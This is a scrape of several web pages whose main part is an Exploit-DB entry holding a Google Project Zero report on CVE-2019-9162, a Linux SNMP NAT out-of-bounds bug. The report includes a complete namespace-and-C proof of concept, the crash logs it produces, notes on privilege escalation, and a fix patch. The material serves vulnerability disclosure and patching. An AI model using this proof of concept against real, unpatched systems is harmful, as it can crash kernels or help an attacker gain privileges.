* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugs.chromium.org_75eb5ba2_20250120_234514.html ===



=== Content from support.f5.com_ed0986cb_20250120_234518.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from www.exploit-db.com_59085298_20250120_234521.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module

#### EDB-ID:

###### 46477

#### CVE:

###### [2019-9162](https://nvd.nist.gov/vuln/detail/CVE-2019-9162)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [dos](/?type=dos)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2019-03-01

---

**Vulnerable App:**

```
commit cc2d58634e0f ("netfilter: nf_nat_snmp_basic: use asn1 decoder library",
first in 4.16) changed the nf_nat_snmp_basic module (which, when enabled, parses
and modifies the ASN.1-encoded payloads of SNMP messages) so that the kernel's
ASN.1 infrastructure is used instead of an open-coded parser. The common ASN.1
decoder can invoke callbacks when certain objects are encountered. The SNMP
helper has two such callbacks defined in nf_nat_snmp_basic.asn1:

 - For the `version` field of a `Message` (a `INTEGER`), snmp_version() is
   invoked.
 - For each `IpAddress` (according to RFC 1155, a 4-byte octet string),
   snmp_helper() is invoked.

These callbacks contain the following code:

int snmp_version(void *context, size_t hdrlen, unsigned char tag,
                 const void *data, size_t datalen)
{
        if (*(unsigned char *)data > 1)
                return -ENOTSUPP;
        return 1;
}

int snmp_helper(void *context, size_t hdrlen, unsigned char tag,
                const void *data, size_t datalen)
{
        struct snmp_ctx *ctx = (struct snmp_ctx *)context;
        __be32 *pdata = (__be32 *)data;

        if (*pdata == ctx->from) {
                pr_debug("%s: %pI4 to %pI4\n", __func__,
                         (void *)&ctx->from, (void *)&ctx->to);

                if (*ctx->check)
                        fast_csum(ctx, (unsigned char *)data - ctx->begin);
                *pdata = ctx->to;
        }

        return 1;
}

The problem is that both of these callbacks can be invoked by the ASN.1 parser
with `data` pointing at the end of the packet and `datalen==0` (even though, for
the `INTEGER` type, X.690 says in section 8.3.1 that "The contents octets shall
consist of one or more octets"), but they don't check whether there is
sufficient input available. This means that snmp_version() can read up to one
byte out-of-bounds and leak whether that byte was <=1, and snmp_helper() can
read and potentially also write up to four bytes out-of-bounds.

Unfortunately, KASAN can't detect the out-of-bounds reads because, as was
pointed out in
<https://lore.kernel.org/lkml/552d49b6-1b6e-c320-b56a-a119e360f1d7@gmail.com/>
regarding a (harmless) out-of-bounds read in the TCP input path, the kernel
stores a `struct skb_shared_info` at the end of the socket buffer allocation,
directly behind the packet data. The kernel can only detect that a problem
occurred based on the later effects of an out-of-bounds write.
It might be a good idea to explicitly add some KASAN poison between the head
data and struct skb_shared_info to make it easier for kernel fuzzers to discover
issues like this in the future.

There are two scenarios in which this bug might be attacked:

 - A router that performs NAT translation is explicitly set up to invoke the
   SNMP helper, and a device in the NATted network wants to attack the router.
   This is probably very rare, since the router would need to be explicitly
   configured to perform SNMP translation. On top of that, to corrupt memory,
   an attacker would need to be able to completely fill an SKB; it isn't clear
   to me whether that is possible remotely.
 - A local attacker could exploit the bug by setting up new network namespaces
   with an iptables configuration that invokes SNMP translation. This probably
   works as a local privilege escalation against some distribution kernels.
   The normal autoloading path for this code was only set up in
   commit 95c97998aa9f ("netfilter: nf_nat_snmp_basic: add missing helper alias
   name", first in 4.20), but from a glance, it looks like it would be possible
   on kernels before 4.20 to instead first load one of the openvswitch module's
   aliases "net-pf-16-proto-16-family-ovs_*" through ctrl_getfamily(), then use
   ovs_ct_add_helper() to trigger loading of "nf_nat_snmp_basic" through the
   alias "ip_nat_snmp_basic".

The following is a reproducer for a git master build that causes a kernel oops
(nf_nat_snmp_basic must be compiled into the kernel, or built as a module, I
think):

======================================================================
#!/bin/sh
unshare -mUrnp --mount-proc --fork bash <<SCRIPT_EOF
set -e
set -x

# make "ip netns" work in here
mount -t tmpfs none /var/run/
cd /var/run

# this namespace is the router with NAT
ip link set dev lo up
echo 1 > /proc/sys/net/ipv4/ip_forward
/sbin/iptables -t nat -A POSTROUTING -o veth0 -j MASQUERADE
/sbin/iptables -t raw -A PREROUTING -p udp --dport 162 -j CT --helper snmp_trap
/sbin/iptables -A FORWARD -m conntrack --ctstate INVALID,NEW,RELATED,ESTABLISHED,SNAT,DNAT -m helper --helper snmp_trap -j ACCEPT

# this namespace is the destination host for the SNMP trap message
ip netns add netns1
nsenter --net=/var/run/netns/netns1 ip link set dev lo up
ip link add veth0 type veth peer name veth1
ip link set veth1 netns netns1
nsenter --net=/var/run/netns/netns1 /sbin/ifconfig veth1 192.168.0.2/24 up
/sbin/ifconfig veth0 192.168.0.1/24 up

# this namespace sends the SNMP trap message
ip netns add netns2
nsenter --net=/var/run/netns/netns2 ip link set dev lo up
ip link add veth2 type veth peer name veth3
ip link set veth3 netns netns2
# /31 network, see RFC 3021
# we want *.0.0.0 so that the 3 OOB bytes can be zero
nsenter --net=/var/run/netns/netns2 /sbin/ifconfig veth3 10.0.0.0/31 up
/sbin/ifconfig veth2 10.0.0.1/24 up
nsenter --net=/var/run/netns/netns2 ip route add default via 10.0.0.1

# debug
ip route
nsenter --net=/var/run/netns/netns2 ip route

# run the PoC
cat > udp_repro.c <<C_EOF
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdlib.h>
#include <errno.h>
#include <stdarg.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define IPADDR(a,b,c,d) (((a)<<0)+((b)<<8)+((c)<<16)+((d)<<24))

// "pc X" comments in the following array refer to indices into
// nf_nat_snmp_basic_machine in "nf_nat_snmp_basic.asn1.c", which
// is generated as part of the kernel's build process.
// reading the ASN.1 decoder and the generated machine opcodes
// seemed easier than trying to build ASN.1 by looking at the
// spec or something like that...
uint8_t snmp_packet[] = {
  // pc 0: read tag, should match _tag(UNIV, CONS, SEQ) == 0x30
  // length indef
  0x30, 0x80,

  // pc 2: read tag, should match _tag(UNIV, PRIM, INT) == 0x02
  // version number
  0x02, 0x01,
  0x00,

  // pc 5: read tag, should match _tag(UNIV, PRIM, OTS) == 0x04
  0x04, 0x00,

  // pc 7: read tag, should match _tagn(CONT, CONS,  0) == 0xa0
  // selects GetRequest-PDU, length indef
  0xa0, 0x80,

  // pc 34: read INT request-id
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 36: read INT error-status
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 38: read INT error-index
  0x02, 0x04,
  0x00, 0x00, 0x00, 0x00,

  // pc 40: read seq VarBindList
  // length indef
  0x30, 0x80,

  // pc 42: read seq VarBind
  // length indef
  0x30, 0x80,

  // ptr 44: read tag, should match _tag(UNIV, PRIM, OID) == 0x06
  // ObjectName
  // (can use 0x82 as length to have two bytes of length following)
  // length chosen so that the end of packet data is directly
  // followed by the skb_shared_info, with the whole thing in a
  // kmalloc-512 slab.
  0x06, 0x70,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

  // ptr 46: read tag, should skip
  // ptr 48: read tag, should skip
  // ptr 50: read tag, should skip
  // ptr 52: read tag, should match _tagn(APPL, PRIM,  0) == 0x40
  // IpAddress
  // we could also use a length of zero, and the callback would still
  // be invoked, but we want control over the first byte so that we
  // can create a source IP match.
  0x40, 0x01,
  // source IP 10.0.0.0
  0x0a
};

void do_sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen) {
  int res = sendto(sockfd, buf, len, flags, dest_addr, addrlen);
  if (res != len) {
    if (res == -1)
      err(1, "send failed");
    else
      errx(1, "partial send?");
  }
}

int main(void) {
  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock == -1) err(1, "socket");

  struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(162), .sin_addr = { .s_addr = IPADDR(192,168,0,2) } };

  // __ip_append_data() overallocates by 15 bytes for some reason; cancel it out
  // by using CORK to first send 15 bytes short, then append the remaining 15 bytes
  do_sendto(sock, snmp_packet, sizeof(snmp_packet)-15, MSG_MORE, (struct sockaddr *)&sa, sizeof(sa));
  do_sendto(sock, ((char*)snmp_packet)+sizeof(snmp_packet)-15, 15, 0, (struct sockaddr *)&sa, sizeof(sa));
}
C_EOF
gcc -o udp_repro udp_repro.c -Wall
nsenter --net=/var/run/netns/netns2 ./udp_repro
SCRIPT_EOF
======================================================================

Corresponding splat:

======================================================================
[  260.101983] IPVS: ftp: loaded support on port[0] = 21
[  260.134983] LoadPin: vda1 (254:1): writable
[  260.135981] LoadPin: enforcement can be disabled.
[  260.137085] LoadPin: kernel-module pinned obj="/lib/modules/5.0.0-rc5/kernel/net/bpfilter/bpfilter.ko" pid=1095 cmdline="/sbin/modprobe -q -- bpfilter"
[  260.143100] bpfilter: Loaded bpfilter_umh pid 1096
[  260.171851] IPVS: ftp: loaded support on port[0] = 21
[  260.248339] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
[  260.250475] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
[  260.261136] IPVS: ftp: loaded support on port[0] = 21
[  260.347678] IPv6: ADDRCONF(NETDEV_CHANGE): veth3: link becomes ready
[  260.621924] page:ffffea000703de00 count:0 mapcount:-128 mapping:0000000000000000 index:0x0
[  260.624264] flags: 0x17fffc000000000()
[  260.625373] raw: 017fffc000000000 ffffea0007a6d408 ffffea000783fe08 0000000000000000
[  260.627650] raw: 0000000000000000 0000000000000003 00000000ffffff7f 0000000000000000
[  260.629926] page dumped because: VM_BUG_ON_PAGE(page_ref_count(page) == 0)
[  260.631958] ------------[ cut here ]------------
[  260.633312] kernel BUG at ./include/linux/mm.h:546!
[  260.634771] invalid opcode: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN
[  260.636693] CPU: 6 PID: 1121 Comm: udp_repro Not tainted 5.0.0-rc5 #263
[  260.638583] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
[  260.641031] RIP: 0010:do_exit+0x1391/0x1440
[  260.642266] Code: 89 86 68 05 00 00 48 89 ac 24 e0 00 00 00 e9 2a f5 ff ff 4d 89 fd e9 6d f2 ff ff 48 c7 c6 c0 cf 67 99 48 89 ef e8 ef a5 24 00 <0f> 0b 48 8d bb 20 05 00 00 e8 11 77 2b 00 48 8d bb 18 05 00 00 4c
[  260.647667] RSP: 0018:ffff8881e083fd98 EFLAGS: 00010286
[  260.649556] RAX: 000000000000003e RBX: ffff8881deed4240 RCX: 0000000000000000
[  260.651639] RDX: 0000000000000000 RSI: dffffc0000000000 RDI: ffffffff9b65eaa0
[  260.653712] RBP: ffffea000703de00 R08: ffffed103d633ec9 R09: ffffed103d633ec9
[  260.655786] R10: 0000000000000001 R11: ffffed103d633ec8 R12: ffffea000703de34
[  260.657857] R13: ffff8881e6262140 R14: ffff8881e083f918 R15: ffff8881e083fe78
[  260.659939] FS:  0000000000000000(0000) GS:ffff8881eb180000(0000) knlGS:0000000000000000
[  260.662281] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  260.664171] CR2: 00007fe2da7af5e0 CR3: 000000002de2b002 CR4: 0000000000360ee0
[  260.666987] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[  260.670022] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[  260.672035] Call Trace:
[  260.672761]  ? release_task+0x860/0x860
[  260.673864]  ? __fd_install+0x88/0x140
[  260.674946]  ? handle_mm_fault+0x82/0x130
[  260.676100]  do_group_exit+0x79/0x120
[  260.677157]  __x64_sys_exit_group+0x28/0x30
[  260.678362]  do_syscall_64+0x73/0x160
[  260.679440]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  260.680878] RIP: 0033:0x7fe2da7af618
[  260.681922] Code: Bad RIP value.
[  260.682872] RSP: 002b:00007ffd5a5e12c8 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
[  260.685057] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fe2da7af618
[  260.687125] RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000
[  260.689197] RBP: 00007fe2daa8c8e0 R08: 00000000000000e7 R09: ffffffffffffff98
[  260.691264] R10: 00007ffd5a5e1248 R11: 0000000000000246 R12: 00007fe2daa8c8e0
[  260.693343] R13: 00007fe2daa91c20 R14: 0000000000000000 R15: 0000000000000000
[  260.695412] Modules linked in: bpfilter
[  260.696776] ---[ end trace d5f4a4a31d762416 ]---
[  260.698931] RIP: 0010:do_exit+0x1391/0x1440
[  260.700171] Code: 89 86 68 05 00 00 48 89 ac 24 e0 00 00 00 e9 2a f5 ff ff 4d 89 fd e9 6d f2 ff ff 48 c7 c6 c0 cf 67 99 48 89 ef e8 ef a5 24 00 <0f> 0b 48 8d bb 20 05 00 00 e8 11 77 2b 00 48 8d bb 18 05 00 00 4c
[  260.705625] RSP: 0018:ffff8881e083fd98 EFLAGS: 00010286
[  260.707183] RAX: 000000000000003e RBX: ffff8881deed4240 RCX: 0000000000000000
[  260.708823] RDX: 0000000000000000 RSI: dffffc0000000000 RDI: ffffffff9b65eaa0
[  260.710384] RBP: ffffea000703de00 R08: ffffed103d633ec9 R09: ffffed103d633ec9
[  260.711888] R10: 0000000000000001 R11: ffffed103d633ec8 R12: ffffea000703de34
[  260.713785] R13: ffff8881e6262140 R14: ffff8881e083f918 R15: ffff8881e083fe78
[  260.715326] FS:  00007fe2dac99700(0000) GS:ffff8881eb180000(0000) knlGS:0000000000000000
[  260.717071] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  260.718340] CR2: 00007fe2da7af5ee CR3: 000000002de2b002 CR4: 0000000000360ee0
[  260.719867] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[  260.721389] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[  260.722923] Fixing recursive fault but reboot is needed!
======================================================================

It also works against a Debian testing distro kernel if you first (as root)
set kernel.unprivileged_userns_clone=1 and modprobe nf_nat_snmp_basic; splat:

======================================================================
[17260.886470] IPv6: ADDRCONF(NETDEV_UP): veth1: link is not ready
[17260.887304] IPv6: ADDRCONF(NETDEV_UP): veth0: link is not ready
[17260.887310] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
[17260.887334] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
[17260.930188] IPv6: ADDRCONF(NETDEV_UP): veth3: link is not ready
[17260.931286] IPv6: ADDRCONF(NETDEV_CHANGE): veth3: link becomes ready
[17261.115583] BUG: Bad page state in process Xorg  pfn:276500
[17261.115588] page:ffffcf4ac9d94000 count:-1 mapcount:0 mapping:0000000000000000 index:0x0
[17261.115595] flags: 0x17fffc000000000()
[17261.115598] raw: 017fffc000000000 dead000000000100 dead000000000200 0000000000000000
[17261.115599] raw: 0000000000000000 0000000000000000 ffffffffffffffff 0000000000000000
[17261.115601] page dumped because: nonzero _count
[17261.115602] Modules linked in: veth xt_helper xt_conntrack nf_nat_snmp_basic nf_conntrack_snmp nf_conntrack_broadcast xt_CT xt_tcpudp nft_counter nft_chain_nat_ipv4 ipt_MASQUERADE nf_nat_ipv4 nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 nft_compat nf_tables nfnetlink uinput atm netrom appletalk psnap llc ax25 snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer joydev qxl snd soundcore ttm drm_kms_helper drm sg evdev virtio_balloon serio_raw virtio_console crct10dif_pclmul crc32_pclmul pcspkr ghash_clmulni_intel button ip_tables x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto ecb btrfs xor zstd_decompress zstd_compress xxhash hid_generic usbhid hid raid6_pq libcrc32c crc32c_generic sr_mod cdrom ata_generic virtio_net net_failover virtio_blk failover crc32c_intel
[17261.115641]  ata_piix libata ehci_pci aesni_intel uhci_hcd aes_x86_64 ehci_hcd crypto_simd cryptd virtio_pci usbcore scsi_mod psmouse glue_helper virtio_ring i2c_piix4 usb_common virtio floppy
[17261.115652] CPU: 14 PID: 653 Comm: Xorg Not tainted 4.19.0-1-amd64 #1 Debian 4.19.12-1
[17261.115653] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
[17261.115654] Call Trace:
[17261.115681]  dump_stack+0x5c/0x80
[17261.115688]  bad_page.cold.115+0x7f/0xb2
[17261.115690]  get_page_from_freelist+0xf51/0x1200
[17261.115694]  ? reservation_object_reserve_shared+0x32/0x70
[17261.115696]  ? get_page_from_freelist+0x8c3/0x1200
[17261.115698]  __alloc_pages_nodemask+0x112/0x2b0
[17261.115703]  new_slab+0x288/0x6e0
[17261.115707]  ? update_blocked_averages+0x3ca/0x560
[17261.115708]  ___slab_alloc+0x378/0x500
[17261.115710]  ? update_nohz_stats+0x41/0x50
[17261.115713]  ? shmem_alloc_inode+0x16/0x30
[17261.115715]  ? shmem_alloc_inode+0x16/0x30
[17261.115716]  __slab_alloc+0x1c/0x30
[17261.115717]  kmem_cache_alloc+0x192/0x1c0
[17261.115719]  shmem_alloc_inode+0x16/0x30
[17261.115722]  alloc_inode+0x1b/0x80
[17261.115725]  new_inode_pseudo+0xc/0x60
[17261.115726]  new_inode+0x12/0x30
[17261.115728]  shmem_get_inode+0x49/0x220
[17261.115731]  __shmem_file_setup.part.42+0x3f/0x130
[17261.115754]  drm_gem_object_init+0x26/0x40 [drm]
[17261.115758]  qxl_bo_create+0x79/0x170 [qxl]
[17261.115762]  qxl_gem_object_create+0x60/0x120 [qxl]
[17261.115764]  ? qxl_map_ioctl+0x20/0x20 [qxl]
[17261.115767]  qxl_gem_object_create_with_handle+0x4e/0xb0 [qxl]
[17261.115769]  qxl_alloc_ioctl+0x42/0xa0 [qxl]
[17261.115777]  ? drm_dev_enter+0x19/0x50 [drm]
[17261.115785]  drm_ioctl_kernel+0xa1/0xf0 [drm]
[17261.115807]  drm_ioctl+0x1fc/0x390 [drm]
[17261.115810]  ? qxl_map_ioctl+0x20/0x20 [qxl]
[17261.115812]  ? ep_scan_ready_list.constprop.22+0x1fc/0x220
[17261.115814]  ? __hrtimer_init+0xb0/0xb0
[17261.115816]  ? timerqueue_add+0x52/0x80
[17261.115834]  ? enqueue_hrtimer+0x38/0x90
[17261.115835]  ? hrtimer_start_range_ns+0x1b7/0x2c0
[17261.115836]  do_vfs_ioctl+0xa4/0x630
[17261.115840]  ? __sys_recvmsg+0x83/0xa0
[17261.115841]  ksys_ioctl+0x60/0x90
[17261.115843]  __x64_sys_ioctl+0x16/0x20
[17261.115846]  do_syscall_64+0x53/0x100
[17261.115851]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[17261.115852] RIP: 0033:0x7fb3e93d3747
[17261.115854] Code: 00 00 90 48 8b 05 49 a7 0c 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 19 a7 0c 00 f7 d8 64 89 01 48
[17261.115855] RSP: 002b:00007ffc43daf3f8 EFLAGS: 00003246 ORIG_RAX: 0000000000000010
[17261.115856] RAX: ffffffffffffffda RBX: 0000562c71bece00 RCX: 00007fb3e93d3747
[17261.115857] RDX: 00007ffc43daf430 RSI: 00000000c0086440 RDI: 000000000000000e
[17261.115857] RBP: 00007ffc43daf430 R08: 0000562c71bece00 R09: 00000000000003d1
[17261.115858] R10: 0000562c71085010 R11: 0000000000003246 R12: 00000000c0086440
[17261.115858] R13: 000000000000000e R14: 0000562c710bcba0 R15: 0000562c710d82f0
[17261.115860] Disabling lock debugging due to kernel taint
======================================================================

I suggest the following patch (copy attached with proper whitespace); I have
tested that it prevents my PoC from crashing the kernel, but I haven't tested
whether SNMP NATting still works.

======================================================================
From b94c17fa81f8870885baaec7815eee8b789d2c7b Mon Sep 17 00:00:00 2001
From: Jann Horn <jannh@google.com>
Date: Wed, 6 Feb 2019 22:56:15 +0100
Subject: [PATCH] netfilter: nf_nat_snmp_basic: add missing length checks in
 ASN.1 cbs

The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
will get as much data as they expect; callbacks have to check the `datalen`
parameter before looking at `data`. Make sure that snmp_version() and
snmp_helper() don't read/write beyond the end of the packet data.

(Also move the assignment to `pdata` down below the check to make it clear
that it isn't necessarily a pointer we can use before the `datalen` check.)

Fixes: cc2d58634e0f ("netfilter: nf_nat_snmp_basic: use asn1 decoder library")
Signed-off-by: Jann Horn <jannh@google.com>
---
 net/ipv4/netfilter/nf_nat_snmp_basic_main.c | 7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)

diff --git a/net/ipv4/netfilter/nf_nat_snmp_basic_main.c b/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
index a0aa13bcabda..0a8a60c1bf9a 100644
--- a/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
+++ b/net/ipv4/netfilter/nf_nat_snmp_basic_main.c
@@ -105,6 +105,8 @@ static void fast_csum(struct snmp_ctx *ctx, unsigned char offset)
 int snmp_version(void *context, size_t hdrlen, unsigned char tag,
                 const void *data, size_t datalen)
 {
+       if (datalen != 1)
+               return -EINVAL;
        if (*(unsigned char *)data > 1)
                return -ENOTSUPP;
        return 1;
@@ -114,8 +116,11 @@ int snmp_helper(void *context, size_t hdrlen, unsigned char tag,
                const void *data, size_t datalen)
 {
        struct snmp_ctx *ctx = (struct snmp_ctx *)context;
-       __be32 *pdata = (__be32 *)data;
+       __be32 *pdata;

+       if (datalen != 4)
+               return -EINVAL;
+       pdata = (__be32 *)data;
        if (*pdata == ctx->from) {
                pr_debug("%s: %pI4 to %pI4\n", __func__,
                         (void *)&ctx->from, (void *)&ctx->to);
--
2.20.1.611.gfbb209baf1-goog
======================================================================

```

**Tags:**
[Out Of Bounds](/?tag=20)

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=1776)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
